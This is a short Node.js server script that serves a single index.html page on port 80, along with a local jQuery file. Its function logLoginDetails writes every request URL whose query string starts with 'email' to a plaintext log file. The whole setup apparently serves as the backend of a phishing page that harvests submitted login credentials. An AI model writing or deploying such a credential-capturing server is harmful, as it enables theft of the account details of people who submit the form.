'use strict'
const http = require('http')
const fs = require('fs')

var url_path_pairs =
{
    '/favicon.ico' : '',
    '/jquery.js' : 'C:/Program Files/nodejs/node_modules/jquery-2.2.2.js',
}

function getPromiseOnReadFile(filename) {
    return new Promise((res, rej) => {
        fs.readFile(filename, 'utf-8', (err, data) =>
        {
            err ? rej(err) : res(data)
        })
    })
}

let readIndexFile = getPromiseOnReadFile('index.html')
let logFile = 'log.txt'

function logLoginDetails(url) {
    let arr = url.split('=')
    if(arr.length > 0)
        arr = arr[0].split('?')
    if(arr.length > 0)
        arr = arr[1]
    if(arr=='email') {
        fs.appendFile(logFile, url + "\n", (err) => {
            if (err)
                throw err
            console.log(url)
        })
    }
}

const server = http.createServer((request,response) =>
{
    logLoginDetails(request.url)

    if (request.url in url_path_pairs)
    {
        fs.readFile(url_path_pairs[request.url], 'utf-8', (err, data) => response.end(data))
    }
    else
    {
        readIndexFile.then(data => response.end(data))
    }
})

const port = 80
server.listen(port)
console.log('listening on port ' + port)
